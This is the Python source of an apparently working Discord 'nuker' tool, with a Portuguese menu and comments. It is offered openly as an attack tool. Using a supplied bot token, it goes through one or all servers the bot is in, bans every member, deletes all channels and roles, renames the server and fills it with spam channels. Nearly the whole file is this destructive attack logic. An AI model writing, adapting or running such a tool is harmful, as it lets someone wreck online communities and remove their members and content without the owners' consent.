# Discord Server Nucky :D
# By: Crazy_ArKzX
# Use com Moderacao

import discord
from discord.ext import commands
import os
import sys
import asyncio

from colorama import init, Fore as cc
init()

# REMOVA ESTA LINHA CASO JA TENHA O DISCORD/COLORAMA INSTALADO
os.system(f"{sys.executable} -m pip install discord colorama")

# Cor das Mensagens no Terminal
class Cores:
    VERMELHO = cc.LIGHTRED_EX
    VERDE = cc.LIGHTGREEN_EX
    AZUL = cc.LIGHTBLUE_EX
    MAGENTA = cc.LIGHTMAGENTA_EX
    CIANO = cc.LIGHTCYAN_EX
    AMARELO = cc.LIGHTYELLOW_EX
    RESETAR = cc.RESET

# Sistema que Limpa seu Chat
def LPC():
    os.system('cls' if os.name == 'nt' else 'clear')

# Entrada Personalizada
def entp(prompt):
    print(prompt, end='')
    return input()

# Aqui Ficam as Configs
class attack:
    def __init__(self):
        self.cliente = None
        self.token = None
        self.channelname = None
        self.servername = None

    async def banall(self, servidor):
        banidos = 0
        for membro in servidor.members:
            try:
                await membro.ban()
                banidos += 1
            except:
                continue
        return banidos

    async def clearallchannels(self, servidor):
        excluidos = 0
        for canal in servidor.channels:
            try:
                await canal.delete()
                excluidos += 1
            except:
                continue
        return excluidos

    async def clearallroles(self, servidor):
        excluidos = 0
        for cargo in servidor.roles:
            try:
                await cargo.delete()
                excluidos += 1
            except:
                continue
        return excluidos

    async def createchannels(self, servidor, nome):
        criados = 0
        for _ in range(200 - len(servidor.channels)):
            try:
                await servidor.create_text_channel(name=nome)
                criados += 1
            except:
                continue
        return criados

    async def UPPP(self, servidor):
        print(f'{Cores.VERMELHO}Atacando: {Cores.MAGENTA}{servidor.name}')
        
        if self.servername:
            try:
                await servidor.edit(name=self.servername)
                print(f'{Cores.MAGENTA}Nome do Servidor Alterado Para: {Cores.AZUL}{self.servername}')
            except:
                print(f'{Cores.VERMELHO}Não foi Possível Alterar o Nome do Servidor')

        banidos = await self.banall(servidor)
        print(f'{Cores.MAGENTA}Banidos:{Cores.AZUL}{banidos}')

        canais_excluidos = await self.clearallchannels(servidor)
        print(f'{Cores.MAGENTA}Canais Excluídos:{Cores.AZUL}{canais_excluidos}')

        cargos_excluidos = await self.clearallroles(servidor)
        print(f'{Cores.MAGENTA}Cargos Excluídos:{Cores.AZUL}{cargos_excluidos}')

        canais_criados = await self.createchannels(servidor, self.channelname)
        print(f'{Cores.MAGENTA}Canais Criados:{Cores.AZUL}{canais_criados}')
        
        print(f'{Cores.VERMELHO}--------------------------------------------\n\n')

    def executar(self):
        while True:
            LPC()
            
            escolha = input(f'''   
{Cores.CIANO}--------------------------------------------
{Cores.AZUL}[Menu]
    {Cores.AMARELO}└─[1] {Cores.MAGENTA}- {Cores.VERDE}Executar
    {Cores.AMARELO}└─[2] {Cores.MAGENTA}- {Cores.VERDE}Exit
{Cores.AMARELO}====>{Cores.VERDE}''')

            # Aqui vc vai Colocar o Token do bot que vc vai Querer
            # Usar Para Atacar o Servidor Desejado
            if escolha == '1':
                self.token = entp(f'{Cores.AMARELO}Insira o Token do Bot:{Cores.VERDE}')
                self.channelname = entp(f'{Cores.AMARELO}Insira o Nome para os Canais Criados:{Cores.VERDE}')
                self.servername = entp(f'{Cores.AMARELO}Insira um Nome Para o Servidor (Opcional):{Cores.VERDE}')
                
                LPC()
                
               # Opcao Para Atacar Todos os Servers que o Bot Esta
               # Opcao Para Atacar Apenas 1 Servidor que o Bot Esta
                tipo_selecao = entp(f'''
    {Cores.CIANO}--------------------------------------------
    {Cores.AZUL}[Selecione]
    {Cores.AMARELO}└─[1] {Cores.MAGENTA}- {Cores.VERDE}Atacar Todos os Servidores
    {Cores.AMARELO}└─[2] {Cores.MAGENTA}- {Cores.VERDE}Atacar Servidor Pelo ID
    {Cores.AMARELO}└─[3] {Cores.MAGENTA}- {Cores.VERDE}Sair
    {Cores.AMARELO}====>{Cores.VERDE}''')
                
                self.cliente = commands.Bot(command_prefix='.', intents=discord.Intents.all())
                
                if tipo_selecao == '1':
                    @self.cliente.event
                    async def on_ready():
                        print(f'''
                        [+] Logado Como {self.cliente.user.name}
                        [+] Bot em {len(self.cliente.guilds)} Servidores!''')
                        for servidor in self.cliente.guilds:
                            await self.UPPP(servidor)
                        await self.cliente.close()
                        await bot.change_presence(status=discord.Status.invisible)
                
                elif tipo_selecao == '2':
                    id_servidor = entp(f'{Cores.AMARELO}Insira o ID do Servidor:{Cores.VERDE}')
                    
                    @self.cliente.event
                    async def on_ready():
                        for servidor in self.cliente.guilds:
                            if str(servidor.id) == id_servidor:
                                await self.UPPP(servidor)
                        await self.cliente.close()
                
                elif tipo_selecao == '3':
                    print(f'{Cores.VERMELHO}Saindo...')
                    sys.exit()
                
                try:
                    self.cliente.run(self.token)
                    input('Sucesso, Pressione Enter Para Voltar ao Menu...')
                except Exception as erro:
                    if 'Shard ID None Está Solicitando Intents Privilegiados' in str(erro):
                        input(f'{Cores.VERMELHO}Erro de Intents\n{Cores.VERDE}Para Corrigir -> https://prnt.sc/wmrwut\n{Cores.AZUL}Pressione Enter para voltar...')
                    else:
                        input(f'{Cores.VERMELHO}{erro}\n{Cores.AZUL}Pressione Enter para voltar...')
                    continue
            
            elif escolha == '2':
                print(f'{Cores.VERMELHO}Saindo...')
                sys.exit()

def princ():
    attackup = attack()
    attackup.executar()

# FIM.
if __name__ == "__main__":
    princ()